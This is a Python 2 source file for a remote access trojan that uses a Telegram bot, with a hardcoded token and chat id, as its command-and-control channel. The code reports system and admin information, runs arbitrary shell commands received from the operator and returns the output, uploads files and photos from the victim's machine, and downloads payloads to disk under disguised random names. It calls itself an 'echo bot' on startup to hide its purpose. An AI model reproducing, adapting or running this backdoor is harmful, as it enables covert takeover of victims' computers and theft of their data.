# -*- coding: utf-8 -*-

import subprocess
import os
import threading
import time
import platform
import json
import ssl
import random
import string
import locale

import six
import requests


telegram_bot_token = '140192111:AAGSxqO9Xz9meTaG7Ecdh80LGnYXNIbbgp4'
telegram_chat_id = '184274372'
report_exception = True
telegram_api_url = "https://api.telegram.org/bot{0}/{1}"


def is_string (var):
   return isinstance(var, six.string_types)


def telegram_request(token, method_name, method='get', params=None, files=None, base_url=telegram_api_url):
   telegram_method = base_url.format(token, method_name)
   method_results = requests.request(method, telegram_method, params=params, files=files)
   return results_to_json(method_name, method_results)['result']


def results_to_json(method_name, result):
   if result.status_code != 200:
      error_msg = 'The server returned HTTP {0} {1}. Response body:\n[{2}]'.format(result.status_code, result.reason, result.text.encode('utf8'))
      raise TelegramException(error_msg, method_name, result)

   try:
      json_results = result.json()
   except:
      error_msg = 'The server returned an invalid JSON response. Response body:\n[{0}]'.format(result.text.encode('utf8'))
      raise TelegramException(error_msg, method_name, result)

   if not json_results['ok']:
      error_msg = 'Error code: {0} Description: {1}'.format(json_results['error_code'], json_results['description'])
      raise TelegramException(error_msg, method_name, result)

   return json_results



class Telebot:

   def __init__(self, botapi, chatid):
      self.botapi = botapi
      self.baseurl = "https://api.telegram.org/bot" + self.botapi
      self.chatid = chatid
      self.ssl_cert = ssl.SSLContext(ssl.PROTOCOL_TLSv1)

   def sendMessage(self, message):
      message_params = {'chat_id': self.chatid, 'text': str(message)}

      try:
         message_results = telegram_request(self.botapi, r'sendMessage', params=message_params)
      except:
         temp_log = open(exception_log, 'w')
         temp_log.writelines(message)
         temp_log.close()
         try:
            self.sendDocument(exception_log)
            os.remove(exception_log)
         except:
            os.remove(exception_log)

   def sendDocument(self, path):
      target_file = open(path, 'rb')
      telegram_method = r'sendDocument'
      telegram_params = {'chat_id': self.chatid}
      file_params = {'document': target_file}
      return telegram_request(self.botapi, telegram_method, params=telegram_params, files=file_params, method='post')

   def send_photo(self, path):
      target_photo = open(path.decode(locale.getpreferredencoding()).encode('utf8'), 'rb')
      telegram_method = r'sendPhoto'
      telegram_params = {'chat_id': self.chatid}
      file_params = None
      if not is_string(target_photo):
         file_params = {'photo': target_photo}
      else:
         telegram_params['photo'] = target_photo
      return telegram_request(self.botapi, telegram_method, params=telegram_params, files=file_params, method='post')

   def getCommand(self):
      try:
         updates = json.loads(self.getUpdates())
         updates_object = updates['result'][-1]
         update_offset = int(updates_object['update_id']) + 1
         message = updates_object['message']['text']

         telegram_update_api = self.baseurl + '/getUpdates' + "?offset=" + str(update_offset)
         requests.get(telegram_update_api)

         return message.encode(locale.getpreferredencoding())
      except:
         # If its not a message command, treat it as if it was a document to download
         updates = json.loads(self.getUpdates())
         try:
            updates_object = updates['result'][-1]
            update_offset = int(updates_object['update_id']) + 1
            message_document = updates_object['message']['document']['file_id']
            UploadFile(self.botapi, message_document)

            telegram_update_api = self.baseurl + '/getUpdates' + "?offset=" + str(update_offset)
            requests.get(telegram_update_api)
         except:
            pass  # If the result is neither a message or document, do nothing.

   def getUpdates(self):
      telegram_update_api = self.baseurl + '/getUpdates'
      update_info = requests.get(telegram_update_api)
      return update_info.text



def send_exception_info(exc):
   exception_info = str(exc) + '\n'
   telebot_instance.sendMessage(exception_info)


def force_checkin():
   system_info = "SYSPROC = " + str(os_info()) + "; IsAdmin = " + str(is_admin())
   ouput = {'OUTCMD': 'checkinfo', 'RES': system_info}
   telebot_instance.sendMessage(ouput)


def os_info():
   return '{}-{}'.format(platform.platform(), os.environ['PROCESSOR_ARCHITECTURE'])


def random_string(slen=10):
   return ''.join(random.sample(string.ascii_letters + string.digits, slen))


class UploadFile(threading.Thread):

   def __init__(self, token, file_id):
      threading.Thread.__init__(self)
      self.token = token
      self.file_id = file_id
      self.payload_name = '~JF' + str(random_string(slen=10)) + '.dat'
      self.daemon = True
      self.start()

   def get_info(self):
      telegram_action = r'getFile'
      return telegram_request(self.token, telegram_action, params={'file_id': self.file_id})

   def run(self):
      try:
         file_object = self.get_info()
         file_path = file_object[u'file_path']
         remote_file = requests.get('https://api.telegram.org/file/bot{0}/{1}'.format(self.token, file_path), stream=True)
         with open(self.payload_name, 'wb') as new_file:
            for chunk in remote_file.iter_content(chunk_size=1024):
               if chunk:
                  new_file.write(chunk)
         upload_msg = "[+]Upload: " + self.payload_name
         telebot_instance.sendMessage(upload_msg)
      except Exception as e:
         if report_exception == True:
            send_exception_info(e)
         pass


def is_admin():
   admin = False
   try:
      system_root = os.listdir(os.sep.join([os.environ.get('SystemRoot', '\\Windows'), 'temp']))
      admin = True
   except:
      admin = False
      pass
   return str(admin)


class ExecuteCommand(threading.Thread):

   def __init__(self, command):
      threading.Thread.__init__(self)
      self.command = command
      self.daemon = True
      self.start()

   def run(self):
      try:
         execution = subprocess.Popen(self.command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         try:
            output = execution.stdout.read().decode('cp866').encode('utf8')
         except Exception as e:
            telebot_instance.sendMessage(str(e))
            output = execution.stdout.read()

         try:
            output += execution.stderr.read().decode('cp866').encode('utf8')
         except Exception as e:
            telebot_instance.sendMessage(str(e))
            output += execution.stdout.read()
         print output  # Leftover debug print statement
         telebot_instance.sendMessage(output)
      except Exception as e:
         if report_exception == True:
            send_exception_info(e)
         pass


class ExecuteCommandDirect(threading.Thread):
   def __init__(self, command):
      threading.Thread.__init__(self)
      self.command = command
      self.daemon = True
      self.start()

   def run(self):
      try:
         telebot_instance.sendMessage(self.command)
         execution = subprocess.Popen(self.command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         output = execution.stdout.read()
         output += execution.stderr.read()
         telebot_instance.sendMessage(output)
      except Exception as e:
         if report_exception == True:
            send_exception_info(e)
         pass


def fetch_commands():
   global default_sleep
   while True:
      try:
         command = str(telebot_instance.getCommand())
         if command == "help":
            help_menu = "cmd||" + "cmd command" + '\n'
            help_menu += "cmdd||" + "cmd command" + '\n'
            help_menu += "getphoto||" + "path" + '\n'
            help_menu += "getdoc||" + "doc path" + '\n'
            help_menu += "forcecheckin||" + "random data" + '\n'
            help_menu += "time||" + "int" + '\n'
            help_menu += "ss||" + "random data" + '\n'
            telebot_instance.sendMessage(help_menu)
         if command.find("||") != (-1):
            delimiter = command.find("||")
            CMD = command[:delimiter]
            delimiter += 2
            ARGS = command[delimiter:]
            command = {'CMD': CMD, 'ARG': ARGS}
            if command['CMD'] and command['ARG']:
               CMD = command['CMD']
               ARGS = command['ARG']
               if CMD == 'cmd':
                  ExecuteCommand(ARGS)
               elif CMD == 'cmdd':
                  ExecuteCommandDirect(ARGS)
               elif CMD == 'getphoto':
                  telebot_instance.send_photo(ARGS)
               elif CMD == 'getdoc':
                  telebot_instance.sendDocument(ARGS)
               elif CMD == 'ss':
                  screenshot()  # Broken functionality
               elif CMD == 'forcecheckin':
                  force_checkin()
               elif CMD == 'time':
                  try:
                     default_sleep = int(ARGS)
                     telebot_instance.sendMessage("Success!")
                     try:
                        open(direct, 'w').write(str(default_sleep))  # This will always throw exception
                     except Exception as e:
                        telebot_instance.sendMessage(str(e))
                  except:
                     telebot_instance.sendMessage("Must be integer")
                     time.sleep(default_sleep)
                     continue
               elif CMD == 'logout':
                  telebot_instance.sendMessage("LOGOUT +")
                  break
               else:
                  time.sleep(default_sleep)
                  continue
         time.sleep(default_sleep)
      except Exception as e:
         if report_exception == True:
            send_exception_info(e)
         time.sleep(default_sleep)
         continue


class TelegramException(Exception):
   def __init__(self, msg, function_name, result):
      super(TelegramException, self).__init__("A request to the Telegram API was unsuccessful. {0}".format(msg))
      self.function_name = function_name
      self.result = result


def main():
   force_checkin()
   try:
      fetch_commands()
   except KeyboardInterrupt:
      pass


if __name__ == '__main__' :
   try:
      default_sleep = 15
      telebot_instance = Telebot(telegram_bot_token, telegram_chat_id)
      telebot_instance.sendMessage("Hey! It`s echo bot")
      telebot_instance.sendMessage(locale.getpreferredencoding())
      while 1 == 1:
         try:
            exception_log = "~DT" + random_string(slen=10) + ".txt"
            main()
            time.sleep(default_sleep)
         except:
            continue
   except:
      pass
